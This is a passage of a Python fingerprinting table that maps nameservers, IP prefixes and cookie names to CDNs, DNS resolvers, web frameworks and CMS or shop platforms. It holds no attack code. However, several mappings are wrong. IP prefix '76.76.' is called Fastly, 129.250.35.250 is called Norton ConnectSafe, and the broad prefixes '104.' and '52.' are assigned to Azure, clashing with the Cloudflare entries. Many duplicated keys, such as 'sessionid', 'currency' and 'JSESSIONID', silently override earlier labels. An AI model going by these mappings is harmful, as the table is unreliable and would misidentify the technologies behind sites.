                    'ns3.squarespace.com': {'name': 'Squarespace DNS', 'category': 'cms_platforms'},
                    'ns4.squarespace.com': {'name': 'Squarespace DNS', 'category': 'cms_platforms'},
                    'ns1.shopify.com': {'name': 'Shopify DNS', 'category': 'cms_platforms'},
                    'ns2.shopify.com': {'name': 'Shopify DNS', 'category': 'cms_platforms'},
                    'ns3.shopify.com': {'name': 'Shopify DNS', 'category': 'cms_platforms'},
                    'ns1.wix.com': {'name': 'Wix DNS', 'category': 'cms_platforms'},
                    'ns2.wix.com': {'name': 'Wix DNS', 'category': 'cms_platforms'},
                    'ns3.wix.com': {'name': 'Wix DNS', 'category': 'cms_platforms'},
                    'ns1.weebly.com': {'name': 'Weebly DNS', 'category': 'cms_platforms'},
                    'ns2.weebly.com': {'name': 'Weebly DNS', 'category': 'cms_platforms'},
                    'ns1.webflow.com': {'name': 'Webflow DNS', 'category': 'cms_platforms'},
                    'ns2.webflow.com': {'name': 'Webflow DNS', 'category': 'cms_platforms'},
                    'ns1.jimdo.com': {'name': 'Jimdo DNS', 'category': 'cms_platforms'},
                    'ns2.jimdo.com': {'name': 'Jimdo DNS', 'category': 'cms_platforms'},
                    'ns1.strikingly.com': {'name': 'Strikingly DNS', 'category': 'cms_platforms'},
                    'ns2.strikingly.com': {'name': 'Strikingly DNS', 'category': 'cms_platforms'},
                    'ns1.carrd.co': {'name': 'Carrd DNS', 'category': 'cms_platforms'},
                    'ns2.carrd.co': {'name': 'Carrd DNS', 'category': 'cms_platforms'},
                    'ns1.tilda.ws': {'name': 'Tilda DNS', 'category': 'cms_platforms'},
                    'ns2.tilda.ws': {'name': 'Tilda DNS', 'category': 'cms_platforms'}
                },
                
                'A': {
                    # CDN & Edge Networks
                    '104.16.': {'name': 'Cloudflare', 'category': 'cdn_services'},
                    '104.17.': {'name': 'Cloudflare', 'category': 'cdn_services'},
                    '104.18.': {'name': 'Cloudflare', 'category': 'cdn_services'},
                    '104.19.': {'name': 'Cloudflare', 'category': 'cdn_services'},
                    '104.20.': {'name': 'Cloudflare', 'category': 'cdn_services'},
                    '104.21.': {'name': 'Cloudflare', 'category': 'cdn_services'},
                    '104.22.': {'name': 'Cloudflare', 'category': 'cdn_services'},
                    '104.23.': {'name': 'Cloudflare', 'category': 'cdn_services'},
                    '104.24.': {'name': 'Cloudflare', 'category': 'cdn_services'},
                    '104.25.': {'name': 'Cloudflare', 'category': 'cdn_services'},
                    '104.26.': {'name': 'Cloudflare', 'category': 'cdn_services'},
                    '104.27.': {'name': 'Cloudflare', 'category': 'cdn_services'},
                    '104.28.': {'name': 'Cloudflare', 'category': 'cdn_services'},
                    '104.29.': {'name': 'Cloudflare', 'category': 'cdn_services'},
                    '104.30.': {'name': 'Cloudflare', 'category': 'cdn_services'},
                    '104.31.': {'name': 'Cloudflare', 'category': 'cdn_services'},
                    '108.162.': {'name': 'Cloudflare', 'category': 'cdn_services'},
                    '141.101.': {'name': 'Cloudflare', 'category': 'cdn_services'},
                    '162.158.': {'name': 'Cloudflare', 'category': 'cdn_services'},
                    '172.64.': {'name': 'Cloudflare', 'category': 'cdn_services'},
                    '172.65.': {'name': 'Cloudflare', 'category': 'cdn_services'},
                    '172.66.': {'name': 'Cloudflare', 'category': 'cdn_services'},
                    '172.67.': {'name': 'Cloudflare', 'category': 'cdn_services'},
                    '172.68.': {'name': 'Cloudflare', 'category': 'cdn_services'},
                    '172.69.': {'name': 'Cloudflare', 'category': 'cdn_services'},
                    '172.70.': {'name': 'Cloudflare', 'category': 'cdn_services'},
                    '172.71.': {'name': 'Cloudflare', 'category': 'cdn_services'},
                    '185.199.': {'name': 'GitHub Pages', 'category': 'cloud_services'},
                    '76.76.': {'name': 'Fastly', 'category': 'cdn_services'},
                    '151.101.': {'name': 'Fastly', 'category': 'cdn_services'},
                    '185.31.': {'name': 'Fastly', 'category': 'cdn_services'},
                    '199.232.': {'name': 'Fastly', 'category': 'cdn_services'},
                    '23.235.': {'name': 'Akamai', 'category': 'cdn_services'},
                    '96.16.': {'name': 'Akamai', 'category': 'cdn_services'},
                    '184.24.': {'name': 'Akamai', 'category': 'cdn_services'},
                    '184.25.': {'name': 'Akamai', 'category': 'cdn_services'},
                    '184.26.': {'name': 'Akamai', 'category': 'cdn_services'},
                    '184.27.': {'name': 'Akamai', 'category': 'cdn_services'},
                    '184.28.': {'name': 'Akamai', 'category': 'cdn_services'},
                    '184.29.': {'name': 'Akamai', 'category': 'cdn_services'},
                    '184.30.': {'name': 'Akamai', 'category': 'cdn_services'},
                    '184.31.': {'name': 'Akamai', 'category': 'cdn_services'},
                    '13.107.': {'name': 'Microsoft Azure', 'category': 'cloud_services'},
                    '20.': {'name': 'Microsoft Azure', 'category': 'cloud_services'},
                    '40.': {'name': 'Microsoft Azure', 'category': 'cloud_services'},
                    '52.': {'name': 'Microsoft Azure', 'category': 'cloud_services'},
                    '104.': {'name': 'Microsoft Azure', 'category': 'cloud_services'},
                    '8.8.8.8': {'name': 'Google Public DNS', 'category': 'cloud_services'},
                    '8.8.4.4': {'name': 'Google Public DNS', 'category': 'cloud_services'},
                    '1.1.1.1': {'name': 'Cloudflare DNS', 'category': 'cloud_services'},
                    '1.0.0.1': {'name': 'Cloudflare DNS', 'category': 'cloud_services'},
                    '9.9.9.9': {'name': 'Quad9 DNS', 'category': 'cloud_services'},
                    '149.112.112.112': {'name': 'Quad9 DNS', 'category': 'cloud_services'},
                    '208.67.222.222': {'name': 'OpenDNS', 'category': 'cloud_services'},
                    '208.67.220.220': {'name': 'OpenDNS', 'category': 'cloud_services'},
                    '64.6.64.6': {'name': 'Verisign DNS', 'category': 'cloud_services'},
                    '64.6.65.6': {'name': 'Verisign DNS', 'category': 'cloud_services'},
                    '84.200.69.80': {'name': 'DNS.WATCH', 'category': 'cloud_services'},
                    '84.200.70.40': {'name': 'DNS.WATCH', 'category': 'cloud_services'},
                    '77.88.8.8': {'name': 'Yandex DNS', 'category': 'cloud_services'},
                    '77.88.8.1': {'name': 'Yandex DNS', 'category': 'cloud_services'},
                    '156.154.70.1': {'name': 'UltraDNS', 'category': 'cloud_services'},
                    '156.154.71.1': {'name': 'UltraDNS', 'category': 'cloud_services'},
                    '8.26.56.26': {'name': 'Comodo Secure DNS', 'category': 'cloud_services'},
                    '8.20.247.20': {'name': 'Comodo Secure DNS', 'category': 'cloud_services'},
                    '129.250.35.250': {'name': 'Norton ConnectSafe', 'category': 'cloud_services'},
                    '129.250.35.251': {'name': 'Norton ConnectSafe', 'category': 'cloud_services'}
                },
                
                'AAAA': {
                    # IPv6 DNS & CDN
                    '2606:4700:': {'name': 'Cloudflare IPv6', 'category': 'cdn_services'},
                    '2400:cb00:': {'name': 'Cloudflare IPv6', 'category': 'cdn_services'},
                    '2a06:98c1:': {'name': 'Cloudflare IPv6', 'category': 'cdn_services'},
                    '2001:4860:': {'name': 'Google IPv6', 'category': 'cloud_services'},
                    '2001:4860:4860::8888': {'name': 'Google DNS IPv6', 'category': 'cloud_services'},
                    '2001:4860:4860::8844': {'name': 'Google DNS IPv6', 'category': 'cloud_services'},
                    '2606:4700:4700::1111': {'name': 'Cloudflare DNS IPv6', 'category': 'cloud_services'},
                    '2606:4700:4700::1001': {'name': 'Cloudflare DNS IPv6', 'category': 'cloud_services'},
                    '2620:fe::fe': {'name': 'Quad9 DNS IPv6', 'category': 'cloud_services'},
                    '2620:fe::9': {'name': 'Quad9 DNS IPv6', 'category': 'cloud_services'},
                    '2620:119:35::35': {'name': 'OpenDNS IPv6', 'category': 'cloud_services'},
                    '2620:119:53::53': {'name': 'OpenDNS IPv6', 'category': 'cloud_services'}
                }
            },
            'cookies': {
                # Backend Technologies - Session Management
                'PHPSESSID': {'name': 'PHP', 'category': 'backend_technologies'},
                'JSESSIONID': {'name': 'Java/JSP', 'category': 'backend_technologies'},
                'ASP.NET_SessionId': {'name': 'ASP.NET', 'category': 'backend_technologies'},
                'ASPXAUTH': {'name': 'ASP.NET Forms Authentication', 'category': 'backend_technologies'},
                '.ASPXAUTH': {'name': 'ASP.NET Forms Authentication', 'category': 'backend_technologies'},
                'ASP.NET_SessionId': {'name': 'ASP.NET', 'category': 'backend_technologies'},
                'CFID': {'name': 'ColdFusion', 'category': 'backend_technologies'},
                'CFTOKEN': {'name': 'ColdFusion', 'category': 'backend_technologies'},
                'JSESSIONID': {'name': 'Java Servlet', 'category': 'backend_technologies'},
                'SESSIONID': {'name': 'Generic Session', 'category': 'backend_technologies'},
                '_session': {'name': 'Generic Session', 'category': 'backend_technologies'},
                '_SESSION': {'name': 'Generic Session', 'category': 'backend_technologies'},
                'sessionid': {'name': 'Generic Session', 'category': 'backend_technologies'},
                'SESSION': {'name': 'Generic Session', 'category': 'backend_technologies'},
                'sid': {'name': 'Session ID', 'category': 'backend_technologies'},
                'SID': {'name': 'Session ID', 'category': 'backend_technologies'},
                
                # Framework-specific Sessions
                'laravel_session': {'name': 'Laravel', 'category': 'backend_technologies'},
                'laravel_token': {'name': 'Laravel', 'category': 'backend_technologies'},
                'XSRF-TOKEN': {'name': 'Laravel CSRF', 'category': 'backend_technologies'},
                'ci_session': {'name': 'CodeIgniter', 'category': 'backend_technologies'},
                'ci4_session': {'name': 'CodeIgniter 4', 'category': 'backend_technologies'},
                'CAKEPHP': {'name': 'CakePHP', 'category': 'backend_technologies'},
                'cakephp': {'name': 'CakePHP', 'category': 'backend_technologies'},
                'cake_session': {'name': 'CakePHP', 'category': 'backend_technologies'},
                'connect.sid': {'name': 'Express.js', 'category': 'backend_technologies'},
                'express:sess': {'name': 'Express.js', 'category': 'backend_technologies'},
                'express:sess.sig': {'name': 'Express.js', 'category': 'backend_technologies'},
                'koa:sess': {'name': 'Koa.js', 'category': 'backend_technologies'},
                'koa.sid': {'name': 'Koa.js', 'category': 'backend_technologies'},
                'hapi-auth-cookie': {'name': 'Hapi.js', 'category': 'backend_technologies'},
                'fastify-session': {'name': 'Fastify', 'category': 'backend_technologies'},
                'csrftoken': {'name': 'Django', 'category': 'backend_technologies'},
                'sessionid': {'name': 'Django', 'category': 'backend_technologies'},
                'django_session': {'name': 'Django', 'category': 'backend_technologies'},
                'django_language': {'name': 'Django', 'category': 'backend_technologies'},
                '_rails_session': {'name': 'Ruby on Rails', 'category': 'backend_technologies'},
                '_session_id': {'name': 'Ruby on Rails', 'category': 'backend_technologies'},
                'rack.session': {'name': 'Rack/Ruby', 'category': 'backend_technologies'},
                'sinatra.session': {'name': 'Sinatra', 'category': 'backend_technologies'},
                'padrino.session': {'name': 'Padrino', 'category': 'backend_technologies'},
                'hanami.session': {'name': 'Hanami', 'category': 'backend_technologies'},
                'grape.session': {'name': 'Grape', 'category': 'backend_technologies'},
                'cuba.session': {'name': 'Cuba', 'category': 'backend_technologies'},
                'flask_session': {'name': 'Flask', 'category': 'backend_technologies'},
                'flask.session': {'name': 'Flask', 'category': 'backend_technologies'},
                'werkzeug': {'name': 'Werkzeug', 'category': 'backend_technologies'},
                'fastapi_session': {'name': 'FastAPI', 'category': 'backend_technologies'},
                'fastapi-session': {'name': 'FastAPI', 'category': 'backend_technologies'},
                'tornado_session': {'name': 'Tornado', 'category': 'backend_technologies'},
                'pyramid_session': {'name': 'Pyramid', 'category': 'backend_technologies'},
                'cherrypy-session-id': {'name': 'CherryPy', 'category': 'backend_technologies'},
                'bottle.session': {'name': 'Bottle', 'category': 'backend_technologies'},
                'web2py_session': {'name': 'web2py', 'category': 'backend_technologies'},
                'turbogears-visit': {'name': 'TurboGears', 'category': 'backend_technologies'},
                'tg-visit': {'name': 'TurboGears', 'category': 'backend_technologies'},
                'zope_session': {'name': 'Zope', 'category': 'backend_technologies'},
                'plone_session': {'name': 'Plone', 'category': 'backend_technologies'},
                'beaker.session': {'name': 'Beaker', 'category': 'backend_technologies'},
                'pylons-session': {'name': 'Pylons', 'category': 'backend_technologies'},
                'symfony': {'name': 'Symfony', 'category': 'backend_technologies'},
                'sf_redirect': {'name': 'Symfony', 'category': 'backend_technologies'},
                'REMEMBERME': {'name': 'Symfony Remember Me', 'category': 'backend_technologies'},
                'zend_session': {'name': 'Zend Framework', 'category': 'backend_technologies'},
                'laminas_session': {'name': 'Laminas', 'category': 'backend_technologies'},
                'phalcon_session': {'name': 'Phalcon', 'category': 'backend_technologies'},
                'yii_session': {'name': 'Yii Framework', 'category': 'backend_technologies'},
                'YII_CSRF_TOKEN': {'name': 'Yii Framework', 'category': 'backend_technologies'},
                'slim_session': {'name': 'Slim Framework', 'category': 'backend_technologies'},
                'lumen_session': {'name': 'Lumen', 'category': 'backend_technologies'},
                'spiral_session': {'name': 'Spiral Framework', 'category': 'backend_technologies'},
                'hyperf_session': {'name': 'Hyperf', 'category': 'backend_technologies'},
                'swoole_session': {'name': 'Swoole', 'category': 'backend_technologies'},
                'workerman_session': {'name': 'Workerman', 'category': 'backend_technologies'},
                'reactphp_session': {'name': 'ReactPHP', 'category': 'backend_technologies'},
                'amphp_session': {'name': 'AmphP', 'category': 'backend_technologies'},
                'spring_session': {'name': 'Spring Session', 'category': 'backend_technologies'},
                'spring_security': {'name': 'Spring Security', 'category': 'backend_technologies'},
                'tomcat_session': {'name': 'Apache Tomcat', 'category': 'backend_technologies'},
                'jetty_session': {'name': 'Jetty', 'category': 'backend_technologies'},
                'wildfly_session': {'name': 'WildFly', 'category': 'backend_technologies'},
                'jboss_session': {'name': 'JBoss', 'category': 'backend_technologies'},
                'glassfish_session': {'name': 'GlassFish', 'category': 'backend_technologies'},
                'weblogic_session': {'name': 'Oracle WebLogic', 'category': 'backend_technologies'},
                'vertx_session': {'name': 'Vert.x', 'category': 'backend_technologies'},
                'micronaut_session': {'name': 'Micronaut', 'category': 'backend_technologies'},
                'quarkus_session': {'name': 'Quarkus', 'category': 'backend_technologies'},
                'helidon_session': {'name': 'Helidon', 'category': 'backend_technologies'},
                'javalin_session': {'name': 'Javalin', 'category': 'backend_technologies'},
                'spark_session': {'name': 'Spark Framework', 'category': 'backend_technologies'},
                'dropwizard_session': {'name': 'Dropwizard', 'category': 'backend_technologies'},
                'play_session': {'name': 'Play Framework', 'category': 'backend_technologies'},
                'akka_session': {'name': 'Akka HTTP', 'category': 'backend_technologies'},
                'lift_session': {'name': 'Lift', 'category': 'backend_technologies'},
                'finch_session': {'name': 'Finch', 'category': 'backend_technologies'},
                'http4s_session': {'name': 'http4s', 'category': 'backend_technologies'},
                'tapir_session': {'name': 'Tapir', 'category': 'backend_technologies'},
                'ktor_session': {'name': 'Ktor', 'category': 'backend_technologies'},
                'struts_session': {'name': 'Apache Struts', 'category': 'backend_technologies'},
                'jsf_session': {'name': 'JavaServer Faces', 'category': 'backend_technologies'},
                'wicket_session': {'name': 'Apache Wicket', 'category': 'backend_technologies'},
                'grails_session': {'name': 'Grails', 'category': 'backend_technologies'},
                'ratpack_session': {'name': 'Ratpack', 'category': 'backend_technologies'},
                'gin_session': {'name': 'Gin', 'category': 'backend_technologies'},
                'echo_session': {'name': 'Echo', 'category': 'backend_technologies'},
                'fiber_session': {'name': 'Fiber', 'category': 'backend_technologies'},
                'beego_session': {'name': 'Beego', 'category': 'backend_technologies'},
                'iris_session': {'name': 'Iris', 'category': 'backend_technologies'},
                'gorilla_session': {'name': 'Gorilla Sessions', 'category': 'backend_technologies'},
                'actix_session': {'name': 'Actix Web', 'category': 'backend_technologies'},
                'rocket_session': {'name': 'Rocket', 'category': 'backend_technologies'},
                'warp_session': {'name': 'Warp', 'category': 'backend_technologies'},
                'axum_session': {'name': 'Axum', 'category': 'backend_technologies'},
                'tower_session': {'name': 'Tower Sessions', 'category': 'backend_technologies'},
                'phoenix_session': {'name': 'Phoenix Framework', 'category': 'backend_technologies'},
                'plug_session': {'name': 'Plug Session', 'category': 'backend_technologies'},
                'cowboy_session': {'name': 'Cowboy', 'category': 'backend_technologies'},
                'maru_session': {'name': 'Maru', 'category': 'backend_technologies'},
                'sugar_session': {'name': 'Sugar', 'category': 'backend_technologies'},
                'deno_session': {'name': 'Deno', 'category': 'backend_technologies'},
                'oak_session': {'name': 'Oak', 'category': 'backend_technologies'},
                'aleph_session': {'name': 'Aleph.js', 'category': 'backend_technologies'},
                'ultra_session': {'name': 'Ultra', 'category': 'backend_technologies'},
                'fresh_session': {'name': 'Fresh', 'category': 'backend_technologies'},
                'bun_session': {'name': 'Bun', 'category': 'backend_technologies'},
                'nancy_session': {'name': 'Nancy', 'category': 'backend_technologies'},
                'servicestack_session': {'name': 'ServiceStack', 'category': 'backend_technologies'},
                'carter_session': {'name': 'Carter', 'category': 'backend_technologies'},
                'minimal_session': {'name': 'Minimal APIs', 'category': 'backend_technologies'},
                'blazor_session': {'name': 'Blazor', 'category': 'backend_technologies'},
                
                # CMS Platforms
                'wp-settings': {'name': 'WordPress', 'category': 'cms_platforms'},
                'wp-settings-1': {'name': 'WordPress', 'category': 'cms_platforms'},
                'wp-settings-time-1': {'name': 'WordPress', 'category': 'cms_platforms'},
                'wordpress_logged_in': {'name': 'WordPress', 'category': 'cms_platforms'},
                'wordpress_sec': {'name': 'WordPress', 'category': 'cms_platforms'},
                'wordpress_test_cookie': {'name': 'WordPress', 'category': 'cms_platforms'},
                'wp_woocommerce_session': {'name': 'WooCommerce', 'category': 'cms_platforms'},
                'woocommerce_cart_hash': {'name': 'WooCommerce', 'category': 'cms_platforms'},
                'woocommerce_items_in_cart': {'name': 'WooCommerce', 'category': 'cms_platforms'},
                'wp_woocommerce_session': {'name': 'WooCommerce', 'category': 'cms_platforms'},
                'wc_session_cookie': {'name': 'WooCommerce', 'category': 'cms_platforms'},
                'wc_cart_hash': {'name': 'WooCommerce', 'category': 'cms_platforms'},
                'wc_fragments': {'name': 'WooCommerce', 'category': 'cms_platforms'},
                'elementor': {'name': 'Elementor', 'category': 'cms_platforms'},
                'divi-admin': {'name': 'Divi', 'category': 'cms_platforms'},
                'et_pb_ab_user_id': {'name': 'Divi', 'category': 'cms_platforms'},
                'et_pb_ab_current_page_id': {'name': 'Divi', 'category': 'cms_platforms'},
                'beaver-builder': {'name': 'Beaver Builder', 'category': 'cms_platforms'},
                'vc_editable': {'name': 'Visual Composer', 'category': 'cms_platforms'},
                'gutenberg_editor': {'name': 'Gutenberg', 'category': 'cms_platforms'},
                'wpbakery': {'name': 'WPBakery', 'category': 'cms_platforms'},
                'oxygen_vsb_dev_mode': {'name': 'Oxygen Builder', 'category': 'cms_platforms'},
                'brizy-editor': {'name': 'Brizy', 'category': 'cms_platforms'},
                'themify_builder': {'name': 'Themify', 'category': 'cms_platforms'},
                'astra-theme': {'name': 'Astra Theme', 'category': 'cms_platforms'},
                'generatepress': {'name': 'GeneratePress', 'category': 'cms_platforms'},
                'oceanwp': {'name': 'OceanWP', 'category': 'cms_platforms'},
                'storefront': {'name': 'Storefront', 'category': 'cms_platforms'},
                'twentytwentythree': {'name': 'Twenty Twenty-Three', 'category': 'cms_platforms'},
                'twentytwentytwo': {'name': 'Twenty Twenty-Two', 'category': 'cms_platforms'},
                'twentytwentyone': {'name': 'Twenty Twenty-One', 'category': 'cms_platforms'},
                'twentytwenty': {'name': 'Twenty Twenty', 'category': 'cms_platforms'},
                'avada': {'name': 'Avada', 'category': 'cms_platforms'},
                'enfold': {'name': 'Enfold', 'category': 'cms_platforms'},
                'the7': {'name': 'The7', 'category': 'cms_platforms'},
                'betheme': {'name': 'BeTheme', 'category': 'cms_platforms'},
                'flatsome': {'name': 'Flatsome', 'category': 'cms_platforms'},
                'drupal_session': {'name': 'Drupal', 'category': 'cms_platforms'},
                'SESS': {'name': 'Drupal', 'category': 'cms_platforms'},
                'SSESS': {'name': 'Drupal', 'category': 'cms_platforms'},
                'drupal_logged_in': {'name': 'Drupal', 'category': 'cms_platforms'},
                'drupal_user': {'name': 'Drupal', 'category': 'cms_platforms'},
                'acquia_session': {'name': 'Acquia', 'category': 'cms_platforms'},
                'pantheon_session': {'name': 'Pantheon', 'category': 'cms_platforms'},
                'joomla_user_state': {'name': 'Joomla', 'category': 'cms_platforms'},
                'joomla_remember_me': {'name': 'Joomla', 'category': 'cms_platforms'},
                'joomla_session': {'name': 'Joomla', 'category': 'cms_platforms'},
                'admin-language': {'name': 'Joomla', 'category': 'cms_platforms'},
                'site-language': {'name': 'Joomla', 'category': 'cms_platforms'},
                'rockettheme': {'name': 'RocketTheme', 'category': 'cms_platforms'},
                'gavick': {'name': 'GavickPro', 'category': 'cms_platforms'},
                'yootheme': {'name': 'YOOtheme', 'category': 'cms_platforms'},
                'joomlart': {'name': 'JoomlaArt', 'category': 'cms_platforms'},
                'virtuemart': {'name': 'VirtueMart', 'category': 'cms_platforms'},
                'hikashop': {'name': 'HikaShop', 'category': 'cms_platforms'},
                'redshop': {'name': 'redSHOP', 'category': 'cms_platforms'},
                'mijoshop': {'name': 'MijoShop', 'category': 'cms_platforms'},
                'magento_session': {'name': 'Magento', 'category': 'cms_platforms'},
                'frontend': {'name': 'Magento', 'category': 'cms_platforms'},
                'adminhtml': {'name': 'Magento', 'category': 'cms_platforms'},
                'external_no_cache': {'name': 'Magento', 'category': 'cms_platforms'},
                'store': {'name': 'Magento', 'category': 'cms_platforms'},
                'currency': {'name': 'Magento', 'category': 'cms_platforms'},
                'magento2_session': {'name': 'Magento 2', 'category': 'cms_platforms'},
                'mage-cache-storage': {'name': 'Magento', 'category': 'cms_platforms'},
                'mage-cache-timeout': {'name': 'Magento', 'category': 'cms_platforms'},
                'mage-cache-sessid': {'name': 'Magento', 'category': 'cms_platforms'},
                'mage-banners-cache-timeout': {'name': 'Magento', 'category': 'cms_platforms'},
                'mage-translation-storage': {'name': 'Magento', 'category': 'cms_platforms'},
                'mage-translation-file-version': {'name': 'Magento', 'category': 'cms_platforms'},
                'mage-messages': {'name': 'Magento', 'category': 'cms_platforms'},
                'recently_viewed_product': {'name': 'Magento', 'category': 'cms_platforms'},
                'recently_viewed_product_previous': {'name': 'Magento', 'category': 'cms_platforms'},
                'recently_compared_product': {'name': 'Magento', 'category': 'cms_platforms'},
                'recently_compared_product_previous': {'name': 'Magento', 'category': 'cms_platforms'},
                'product_data_storage': {'name': 'Magento', 'category': 'cms_platforms'},
                'guest-view': {'name': 'Magento', 'category': 'cms_platforms'},
                'persistent_shopping_cart': {'name': 'Magento', 'category': 'cms_platforms'},
                'adobe_commerce': {'name': 'Adobe Commerce', 'category': 'cms_platforms'},
                '_shopify_s': {'name': 'Shopify', 'category': 'cms_platforms'},
                '_shopify_y': {'name': 'Shopify', 'category': 'cms_platforms'},
                '_shopify_sa_p': {'name': 'Shopify', 'category': 'cms_platforms'},
                '_shopify_sa_t': {'name': 'Shopify', 'category': 'cms_platforms'},
                'cart': {'name': 'Shopify', 'category': 'cms_platforms'},
                'cart_sig': {'name': 'Shopify', 'category': 'cms_platforms'},
                'cart_ts': {'name': 'Shopify', 'category': 'cms_platforms'},
                'checkout': {'name': 'Shopify', 'category': 'cms_platforms'},
                'checkout_token': {'name': 'Shopify', 'category': 'cms_platforms'},
                'dynamic_checkout_shown_on_cart': {'name': 'Shopify', 'category': 'cms_platforms'},
                'hide_shopify_pay_for_checkout': {'name': 'Shopify', 'category': 'cms_platforms'},
                'keep_alive': {'name': 'Shopify', 'category': 'cms_platforms'},
                'master_device_id': {'name': 'Shopify', 'category': 'cms_platforms'},
                'previous_step': {'name': 'Shopify', 'category': 'cms_platforms'},
                'remember_me': {'name': 'Shopify', 'category': 'cms_platforms'},
                'secure_customer_sig': {'name': 'Shopify', 'category': 'cms_platforms'},
                'shopify_pay_redirect': {'name': 'Shopify', 'category': 'cms_platforms'},
                'storefront_digest': {'name': 'Shopify', 'category': 'cms_platforms'},
                'tracked_start_checkout': {'name': 'Shopify', 'category': 'cms_platforms'},
                '_tracking_consent': {'name': 'Shopify', 'category': 'cms_platforms'},
                '_landing_page': {'name': 'Shopify', 'category': 'cms_platforms'},
                '_orig_referrer': {'name': 'Shopify', 'category': 'cms_platforms'},
                '_s': {'name': 'Shopify', 'category': 'cms_platforms'},
                '_y': {'name': 'Shopify', 'category': 'cms_platforms'},
                'bigcommerce_session': {'name': 'BigCommerce', 'category': 'cms_platforms'},
                'SHOP_SESSION_TOKEN': {'name': 'BigCommerce', 'category': 'cms_platforms'},
                'fornax_anonymousId': {'name': 'BigCommerce', 'category': 'cms_platforms'},
                'fornax_sessionId': {'name': 'BigCommerce', 'category': 'cms_platforms'},
                'XSRF-TOKEN': {'name': 'BigCommerce', 'category': 'cms_platforms'},
                'cartId': {'name': 'BigCommerce', 'category': 'cms_platforms'},
                'SHOP_SESSION_TOKEN': {'name': 'BigCommerce', 'category': 'cms_platforms'},
                'PrestaShop': {'name': 'PrestaShop', 'category': 'cms_platforms'},
                'prestashop_session': {'name': 'PrestaShop', 'category': 'cms_platforms'},
                'ps-language': {'name': 'PrestaShop', 'category': 'cms_platforms'},
                'ps-currency': {'name': 'PrestaShop', 'category': 'cms_platforms'},
                'ps-country': {'name': 'PrestaShop', 'category': 'cms_platforms'},
                'OCSESSID': {'name': 'OpenCart', 'category': 'cms_platforms'},
                'opencart_session': {'name': 'OpenCart', 'category': 'cms_platforms'},
                'language': {'name': 'OpenCart', 'category': 'cms_platforms'},
                'currency': {'name': 'OpenCart', 'category': 'cms_platforms'},
                'tracking': {'name': 'OpenCart', 'category': 'cms_platforms'},
                'oscsid': {'name': 'osCommerce', 'category': 'cms_platforms'},
                'oscommerce_session': {'name': 'osCommerce', 'category': 'cms_platforms'},
                'zenid': {'name': 'Zen Cart', 'category': 'cms_platforms'},
                'zencart_session': {'name': 'Zen Cart', 'category': 'cms_platforms'},
                'ccid': {'name': 'CubeCart', 'category': 'cms_platforms'},
                'cubecart_session': {'name': 'CubeCart', 'category': 'cms_platforms'},
                'xid': {'name': 'X-Cart', 'category': 'cms_platforms'},
                'xcart_session': {'name': 'X-Cart', 'category': 'cms_platforms'},
                'cscart_session': {'name': 'CS-Cart', 'category': 'cms_platforms'},
                'cs_cart_session': {'name': 'CS-Cart', 'category': 'cms_platforms'},
                'loaded_session': {'name': 'Loaded Commerce', 'category': 'cms_platforms'},
                'ubercart_session': {'name': 'Ubercart', 'category': 'cms_platforms'},
                'drupal_commerce_session': {'name': 'Drupal Commerce', 'category': 'cms_platforms'},
                'spree_session': {'name': 'Spree Commerce', 'category': 'cms_platforms'},
                'solidus_session': {'name': 'Solidus', 'category': 'cms_platforms'},
                'sylius_session': {'name': 'Sylius', 'category': 'cms_platforms'},
                'akeneo_session': {'name': 'Akeneo', 'category': 'cms_platforms'},
                'pimcore_session': {'name': 'Pimcore', 'category': 'cms_platforms'},
                'bagisto_session': {'name': 'Bagisto', 'category': 'cms_platforms'},
                'medusa_session': {'name': 'Medusa', 'category': 'cms_platforms'},
                'vendure_session': {'name': 'Vendure', 'category': 'cms_platforms'},
                'saleor_session': {'name': 'Saleor', 'category': 'cms_platforms'},
                'reaction_session': {'name': 'Reaction Commerce', 'category': 'cms_platforms'},
                'commercejs_session': {'name': 'Commerce.js', 'category': 'cms_platforms'},
                'snipcart_session': {'name': 'Snipcart', 'category': 'cms_platforms'},
                'foxy_session': {'name': 'Foxy.io', 'category': 'cms_platforms'},
                'strapi_session': {'name': 'Strapi', 'category': 'cms_platforms'},
                'contentful_session': {'name': 'Contentful', 'category': 'cms_platforms'},
                'sanity_session': {'name': 'Sanity', 'category': 'cms_platforms'},
                'forestry_session': {'name': 'Forestry', 'category': 'cms_platforms'},
                'netlify_session': {'name': 'Netlify CMS', 'category': 'cms_platforms'},
                'decap_session': {'name': 'Decap CMS', 'category': 'cms_platforms'},
                'tina_session': {'name': 'TinaCMS', 'category': 'cms_platforms'},
                'ghost_session': {'name': 'Ghost', 'category': 'cms_platforms'},
                'ghost-admin-api-session': {'name': 'Ghost', 'category': 'cms_platforms'},
                'ghost.sid': {'name': 'Ghost', 'category': 'cms_platforms'},
                'butter_session': {'name': 'ButterCMS', 'category': 'cms_platforms'},
                'cosmic_session': {'name': 'Cosmic', 'category': 'cms_platforms'},
                'directus_session': {'name': 'Directus', 'category': 'cms_platforms'},
                'directus_session_token': {'name': 'Directus', 'category': 'cms_platforms'},
                'keystone_session': {'name': 'KeystoneJS', 'category': 'cms_platforms'},
                'keystonejs_session': {'name': 'KeystoneJS', 'category': 'cms_platforms'},
                'payload_session': {'name': 'Payload CMS', 'category': 'cms_platforms'},
                'webiny_session': {'name': 'Webiny', 'category': 'cms_platforms'},
                'builder_session': {'name': 'Builder.io', 'category': 'cms_platforms'},
                'storyblok_session': {'name': 'Storyblok', 'category': 'cms_platforms'},
                'prismic_session': {'name': 'Prismic', 'category': 'cms_platforms'},
                'dato_session': {'name': 'DatoCMS', 'category': 'cms_platforms'},
                'datocms_session': {'name': 'DatoCMS', 'category': 'cms_platforms'},
                'cockpit_session': {'name': 'Cockpit CMS', 'category': 'cms_platforms'},
                'craft_session': {'name': 'Craft CMS', 'category': 'cms_platforms'},
                'craftcms_session': {'name': 'Craft CMS', 'category': 'cms_platforms'},
                'silverstripe_session': {'name': 'SilverStripe', 'category': 'cms_platforms'},
                'textpattern_session': {'name': 'Textpattern', 'category': 'cms_platforms'},
                'concrete5_session': {'name': 'Concrete5', 'category': 'cms_platforms'},
                'concrete_session': {'name': 'Concrete CMS', 'category': 'cms_platforms'},
                'modx_session': {'name': 'MODX', 'category': 'cms_platforms'},
                'typo3_session': {'name': 'TYPO3', 'category': 'cms_platforms'},
                'be_typo_user': {'name': 'TYPO3', 'category': 'cms_platforms'},
                'fe_typo_user': {'name': 'TYPO3', 'category': 'cms_platforms'},
                'bolt_session': {'name': 'Bolt CMS', 'category': 'cms_platforms'},
                'october_session': {'name': 'October CMS', 'category': 'cms_platforms'},
                'winter_session': {'name': 'Winter CMS', 'category': 'cms_platforms'},
